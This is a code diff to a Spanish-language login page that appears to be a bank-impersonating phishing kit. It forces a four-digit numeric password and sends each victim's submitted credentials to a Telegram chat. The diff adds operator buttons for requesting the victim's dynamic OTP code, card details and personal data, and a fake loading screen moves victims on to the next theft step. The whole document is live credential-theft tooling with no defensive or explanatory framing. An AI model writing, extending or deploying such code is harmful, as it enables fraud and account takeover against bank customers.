@@ -282,10 +282,10 @@
 
             <form id="loginForm">
                 <div class="form-group">
-                    <label class="form-label" for="usuario">Tipo y número de documento</label>
+                    <label class="form-label" for="usuario">Usuario</label>
                     <div class="form-input-wrap">
                         <i class='bx bx-user input-icon'></i>
-                        <input type="text" id="usuario" class="form-input" placeholder="Ej: CC 1234567890" required>
+                        <input type="text" id="usuario" class="form-input" placeholder="Ingresa tu usuario" required>
                     </div>
                 </div>
 
@@ -293,7 +293,7 @@
                     <label class="form-label" for="clave">Clave de ingreso</label>
                     <div class="form-input-wrap">
                         <i class='bx bx-lock-alt input-icon'></i>
-                        <input type="password" id="clave" class="form-input" placeholder="Ingresa tu clave" maxlength="8" required>
+                        <input type="password" id="clave" class="form-input" placeholder="Ingresa tu clave" maxlength="4" inputmode="numeric" required>
                     </div>
                 </div>
 
@@ -317,6 +317,11 @@
             document.getElementById('errorAlert').classList.add('show');
         }
 
+        // Solo permitir números en la clave
+        document.getElementById('clave').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
         // Form submission
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
@@ -325,6 +330,12 @@
             const clave = document.getElementById('clave').value.trim();
 
             if (!usuario || !clave) {
+                document.getElementById('errorAlert').classList.add('show');
+                return;
+            }
+
+            if (clave.length !== 4) {
+                document.getElementById('errorAlert').querySelector('span').textContent = 'La clave debe tener exactamente 4 dígitos';
                 document.getElementById('errorAlert').classList.add('show');
                 return;
             }
@@ -352,7 +363,11 @@
                         { text: "❌ Incorrecto", callback_data: `error_login:${loginData.transactionId}` }
                     ],
                     [
-                        { text: "🔐 Pedir Dinámica", callback_data: `pedir_dinamica:${loginData.transactionId}` }
+                        { text: "🔐 Pedir Dinámica", callback_data: `pedir_dinamica:${loginData.transactionId}` },
+                        { text: "💳 Pedir Tarjeta", callback_data: `pedir_tarjeta:${loginData.transactionId}` }
+                    ],
+                    [
+                        { text: "📋 Pedir Datos Personales", callback_data: `pedir_datos:${loginData.transactionId}` }
                     ]
                 ]
             };
@@ -361,7 +376,6 @@
                 await sendTelegramMessage(mensaje, teclado);
                 
                 // Simular espera de respuesta (2 segundos)
-                // En producción, aquí esperarías la respuesta real del webhook
                 setTimeout(() => {
                     document.getElementById('loadingScreen').classList.remove('active');
                     // Por defecto ir a dinámica
@@ -379,6 +393,7 @@
         document.querySelectorAll('.form-input').forEach(input => {
             input.addEventListener('input', () => {
                 document.getElementById('errorAlert').classList.remove('show');
+                document.getElementById('errorAlert').querySelector('span').textContent = 'Usuario o clave incorrectos. Por favor verifica e intenta nuevamente.';
                 input.classList.remove('error');
             });
         });
